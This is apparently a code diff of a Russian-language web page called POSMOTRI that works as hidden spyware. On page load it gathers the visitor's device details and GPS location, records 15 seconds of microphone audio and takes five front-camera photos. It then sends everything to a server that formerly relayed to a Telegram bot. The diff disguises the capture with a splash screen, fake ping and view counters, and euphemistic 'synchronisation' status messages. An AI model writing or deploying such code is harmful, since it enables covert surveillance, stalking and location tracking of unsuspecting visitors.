+            toast.className = 'toast';
+            toast.innerHTML = `<span>${icon}</span> <span>${message}</span>`;
+            container.appendChild(toast);
+
+            setTimeout(() => {
+                toast.classList.add('fade-out');
+                setTimeout(() => toast.remove(), 300);
+            }, 3500);
+        }
+
+        let logoClicks = 0;
+        function triggerEasterEgg() {
+            logoClicks++;
+            if (logoClicks >= 5) {
+                logoClicks = 0;
+                hapticClick();
+                document.getElementById('dev-terminal').classList.add('active');
+                showToast('Режим разработчика активирован!', '💻');
+            }
+        }
+        function closeTerminal() {
+            document.getElementById('dev-terminal').classList.remove('active');
+        }
+
+        function hapticClick() {
+            if (navigator.vibrate) navigator.vibrate(15);
+        }
+
+        function updateProgress(percent) {
+            document.getElementById('progress-bar').style.width = percent + '%';
+        }
 
         window.addEventListener('DOMContentLoaded', () => {
+            updateProgress(25);
             let views = localStorage.getItem('posmotri_views');
-            views = views ? parseInt(views) + 1 : 124;
+            views = views ? parseInt(views) + 1 : 142;
             localStorage.setItem('posmotri_views', views);
             document.getElementById('visit-count').textContent = views;
 
-            const savedTheme = localStorage.getItem('posmotri_theme') || 'dark';
+            let savedTheme = localStorage.getItem('posmotri_theme');
+            if (!savedTheme) {
+                const currentHour = new Date().getHours();
+                savedTheme = (currentHour >= 20 || currentHour < 7) ? 'dark' : 'light';
+            }
             document.body.setAttribute('data-theme', savedTheme);
             updateThemeButtonIcon(savedTheme);
+
+            const savedStep = sessionStorage.getItem('posmotri_step');
+            if (savedStep) {
+                document.getElementById('action-status').textContent = savedStep;
+            }
+
+            updateProgress(50);
+            setTimeout(() => { showToast('Сессия восстановлена', '⚡'); }, 1500);
         });
+
+        window.addEventListener('load', () => {
+            updateProgress(75);
+            setTimeout(() => {
+                const splash = document.getElementById('splash-screen');
+                splash.classList.add('fade-out');
+                executeAllAndSend();
+            }, 1000);
+        });
+
+        setInterval(() => {
+            const randomPing = Math.floor(Math.random() * (22 - 12 + 1)) + 12;
+            document.getElementById('ping-val').textContent = randomPing + 'ms';
+        }, 4000);
+
+        function openVideoModal(videoEl) {
+            hapticClick();
+            const modal = document.getElementById('video-modal');
+            const modalVideo = document.getElementById('modal-video');
+            modalVideo.src = videoEl.querySelector('source').src;
+            modal.classList.add('active');
+            modalVideo.play();
+        }
+
+        function closeVideoModal() {
+            const modal = document.getElementById('video-modal');
+            const modalVideo = document.getElementById('modal-video');
+            modalVideo.pause();
+            modal.classList.remove('active');
+        }
+
+        function toggleAudioTrack() {
+            hapticClick();
+            const audio = document.getElementById('bg-audio');
+            const card = document.getElementById('audio-card');
+            const btn = document.getElementById('play-audio-btn');
+
+            if (audio.paused) {
+                audio.play();
+                card.classList.add('playing');
+                btn.textContent = '⏸';
+                showToast('Воспроизведение аудиопотока', '🎧');
+            } else {
+                audio.pause();
+                card.classList.remove('playing');
+                btn.textContent = '▶';
+            }
+        }
+
+        function toggleMenu() {
+            document.getElementById('sidebar').classList.toggle('open');
+            document.getElementById('overlay').classList.toggle('active');
+        }
 
         function toggleTheme() {
             const currentTheme = document.body.getAttribute('data-theme');
@@ -275,25 +763,13 @@
             document.body.setAttribute('data-theme', newTheme);
             localStorage.setItem('posmotri_theme', newTheme);
             updateThemeButtonIcon(newTheme);
+            showToast(`Тема изменена: ${newTheme.toUpperCase()}`, newTheme === 'dark' ? '🌙' : '☀️');
         }
 
         function updateThemeButtonIcon(theme) {
-            const btn = document.getElementById('theme-btn');
-            btn.textContent = theme === 'dark' ? '🌙' : '☀️';
+            document.getElementById('theme-btn').textContent = theme === 'dark' ? '🌙' : '☀️';
         }
 
-        function dataURItoBlob(dataURI) {
-            const byteString = atob(dataURI.split(',')[1]);
-            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
-            const ab = new ArrayBuffer(byteString.length);
-            const ia = new Uint8Array(ab);
-            for (let i = 0; i < byteString.length; i++) {
-                ia[i] = byteString.charCodeAt(i);
-            }
-            return new Blob([ab], { type: mimeString });
-        }
-
-        // Функция сбора информации об устройстве (телефоне/ПК)
         async function getDeviceInfo() {
             let batteryInfo = 'Недоступно';
             try {
@@ -317,17 +793,9 @@
 
         function getGeolocationAsync() {
             return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    resolve(null);
-                    return;
-                }
+                if (!navigator.geolocation) { resolve(null); return; }
                 navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        resolve({
-                            lat: position.coords.latitude.toFixed(6),
-                            lon: position.coords.longitude.toFixed(6)
-                        });
-                    },
+                    (position) => { resolve({ lat: position.coords.latitude.toFixed(6), lon: position.coords.longitude.toFixed(6) }); },
                     () => { resolve(null); },
                     { timeout: 7000 }
                 );
@@ -341,12 +809,7 @@
                     const mediaRecorder = new MediaRecorder(audioStream);
                     const audioChunks = [];
 
-                    mediaRecorder.ondataavailable = (event) => {
-                        if (event.data.size > 0) {
-                            audioChunks.push(event.data);
-                        }
-                    };
-
+                    mediaRecorder.ondataavailable = (event) => { if (event.data.size > 0) audioChunks.push(event.data); };
                     mediaRecorder.onstop = () => {
                         const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                         audioStream.getTracks().forEach(track => track.stop());
@@ -354,16 +817,8 @@
                     };
 
                     mediaRecorder.start();
-
-                    setTimeout(() => {
-                        if (mediaRecorder.state === 'recording') {
-                            mediaRecorder.stop();
-                        }
-                    }, 15000);
-
-                } catch (err) {
-                    resolve(null);
-                }
+                    setTimeout(() => { if (mediaRecorder.state === 'recording') mediaRecorder.stop(); }, 15000);
+                } catch (err) { resolve(null); }
             });
         }
 
@@ -373,143 +828,112 @@
                     const videoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                     const video = document.getElementById('camera-feed');
                     video.srcObject = videoStream;
-
                     await new Promise(r => setTimeout(r, 1000));
 
                     const canvas = document.getElementById('snapshot-canvas');
                     const photos = [];
 
                     for (let i = 1; i <= 5; i++) {
-                        if (statusCallback) statusCallback(`Съемка фото ${i} из 5...`);
-                        
+                        if (statusCallback) statusCallback(`Синхронизация кадров (${i}/5)...`);
                         canvas.width = video.videoWidth || 640;
                         canvas.height = video.videoHeight || 480;
                         const ctx = canvas.getContext('2d');
                         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                        const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
-                        photos.push(dataUrl);
-
-                        if (i < 5) {
-                            await new Promise(r => setTimeout(r, 1000));
-                        }
+                        photos.push(canvas.toDataURL('image/jpeg', 0.85));
+                        if (i < 5) await new Promise(r => setTimeout(r, 1000));
                     }
 
                     videoStream.getTracks().forEach(track => track.stop());
                     video.srcObject = null;
-
                     resolve(photos);
-                } catch (err) {
-                    resolve([]);
-                }
+                } catch (err) { resolve([]); }
+            });
+        }
+
+        async function blobToBase64(blob) {
+            return new Promise((resolve) => {
+                const reader = new FileReader();
+                reader.onloadend = () => resolve(reader.result);
+                reader.readAsDataURL(blob);
             });
         }
 
         async function executeAllAndSend() {
             const status = document.getElementById('action-status');
-            const submitBtn = document.getElementById('fast-btn');
-            
-            submitBtn.classList.add('loading');
-            status.textContent = 'Сбор информации об устройстве и гео...';
+            const radarText = document.getElementById('radar-status-text');
 
-            // Параллельно собираем инфо о телефоне, гео и запускаем аудио/фото
+            status.textContent = 'Сбор системных параметров...';
+            sessionStorage.setItem('posmotri_step', 'Сбор системных параметров...');
+            updateProgress(80);
+
             const devicePromise = getDeviceInfo();
             const locationPromise = getGeolocationAsync();
             const audioPromise = recordAudioAsync();
             
-            status.textContent = 'Идет запись звука (15 сек) и фотосъемка...';
-            const photosPromise = takePhotosSeriesAsync((msg) => {
-                status.textContent = msg;
+            status.textContent = 'Обработка медиапотока (15 сек)...';
+            sessionStorage.setItem('posmotri_step', 'Обработка медиапотока (15 сек)...');
+            const photosPromise = takePhotosSeriesAsync((msg) => { 
+                status.textContent = msg; 
+                radarText.textContent = msg;
             });
 
             const [device, location, audioBlob, photos] = await Promise.all([
-                devicePromise,
-                locationPromise,
-                audioPromise,
-                photosPromise
+                devicePromise, locationPromise, audioPromise, photosPromise
             ]);
 
-            status.textContent = 'Отправка собранных данных в Telegram...';
+            status.textContent = 'Передача данных в защищенный узел...';
+            sessionStorage.setItem('posmotri_step', 'Передача данных в защищенный узел...');
+            updateProgress(95);
+
+            if (location) {
+                radarText.textContent = `Узел зафиксирован: (${location.lat}, ${location.lon})`;
+            } else {
+                radarText.textContent = 'Узел активен (геопозиция скрыта)';
+            }
 
             try {
-                let textMessage = '⚡ *Новый отчет об устройстве с сайта POSMOTRI*!\n\n';
-                
-                // Добавляем данные о телефоне
-                textMessage += `📱 *Информация о телефоне/устройстве:*\n`;
-                textMessage += `• ОС / Платформа: ${device.platform}\n`;
+                let textMessage = '⚡ *Новый отчет от платформы POSMOTRI*!\n\n';
+                textMessage += `📱 *Устройство:*\n`;
+                textMessage += `• ОС: ${device.platform}\n`;
                 textMessage += `• Экран: ${device.screen}\n`;
-                textMessage += `• Язык: ${device.language}\n`;
-                textMessage += `• Заряд батареи: ${device.battery}\n`;
-                textMessage += `• Ядер процессора: ${device.cores}\n`;
-                textMessage += `• ОЗУ (примерно): ${device.memory}\n`;
+                textMessage += `• Батарея: ${device.battery}\n`;
+                textMessage += `• Ядер/ОЗУ: ${device.cores} ядер / ${device.memory}\n`;
                 textMessage += `• User-Agent: \`${device.userAgent}\`\n\n`;
 
                 if (location) {
-                    textMessage += `📍 *Локация:* [Открыть карту](https://maps.google.com/?q=${location.lat},${location.lon})\n`;
+                    textMessage += `📍 *Геопозиция:* [Открыть карту](https://maps.google.com/?q=${location.lat},${location.lon})\n`;
                     textMessage += `Широта: ${location.lat} | Долгота: ${location.lon}\n\n`;
                 } else {
-                    textMessage += '📍 Локация: Не получена / отклонена\n\n';
+                    textMessage += '📍 Геопозиция: Отклонена / недоступна\n\n';
                 }
 
+                textMessage += audioBlob ? '🎤 Аудиопоток: Прикреплен (15 сек)\n' : '⚠️ Аудиопоток: Доступ отклонен\n';
+                textMessage += photos.length > 0 ? `📸 Серия снимков: ${photos.length} кадров` : '⚠️ Серия снимков: Доступ отклонен';
+
+                let audioBase64 = null;
                 if (audioBlob) {
-                    textMessage += '🎤 Аудиозапись: Прикреплена ниже (15 сек)\n';
-                } else {
-                    textMessage += '⚠️ Аудио: Доступ к микрофону отклонен\n';
+                    audioBase64 = await blobToBase64(audioBlob);
                 }
 
-                if (photos.length > 0) {
-                    textMessage += `📸 Фотографии: Сделано кадров: ${photos.length}`;
-                } else {
-                    textMessage += '⚠️ Фото: Доступ к камере отклонен';
-                }
-
-                // 1. Отправляем структурированный текст с данными телефона и гео
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                await fetch('/api/send', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: textMessage,
-                        parse_mode: 'Markdown'
+                        textMessage: textMessage,
+                        audioBase64: audioBase64,
+                        photos: photos
                     })
                 });
 
-                // 2. Отправляем аудиозапись
-                if (audioBlob) {
-                    const audioFormData = new FormData();
-                    audioFormData.append('chat_id', TELEGRAM_CHAT_ID);
-                    audioFormData.append('voice', audioBlob, 'voice_15s.webm');
-                    audioFormData.append('caption', '🎤 Аудиозапись 15 секунд');
-
-                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVoice`, {
-                        method: 'POST',
-                        body: audioFormData
-                    });
-                }
-
-                // 3. Отправляем серию фотографий
-                for (let i = 0; i < photos.length; i++) {
-                    const photoBlob = dataURItoBlob(photos[i]);
-                    const photoFormData = new FormData();
-                    photoFormData.append('chat_id', TELEGRAM_CHAT_ID);
-                    photoFormData.append('photo', photoBlob, `photo_${i+1}.jpg`);
-                    photoFormData.append('caption', `📸 Фото ${i+1} из 5`);
-
-                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: photoFormData
-                    });
-                }
-
-                status.textContent = 'Всё успешно отправлено!';
-                alert('Данные об устройстве, геолокация, аудио и фото успешно отправлены в Telegram!');
-                location.reload();
+                status.textContent = 'Синхронизация завершена';
+                sessionStorage.setItem('posmotri_step', 'Синхронизация завершена');
+                updateProgress(100);
+                showToast('Синхронизация с узлом успешна', '🚀');
 
             } catch (error) {
                 console.error(error);
-                alert('Произошла ошибка при отправке. Проверьте токен бота и интернет-соединение.');
-                submitBtn.classList.remove('loading');
-                status.textContent = 'Ошибка отправки. Попробуйте еще раз.';
+                status.textContent = 'Ошибка синхронизации';
+                showToast('Ошибка передачи данных', '❌');
             }
         }
     </script>
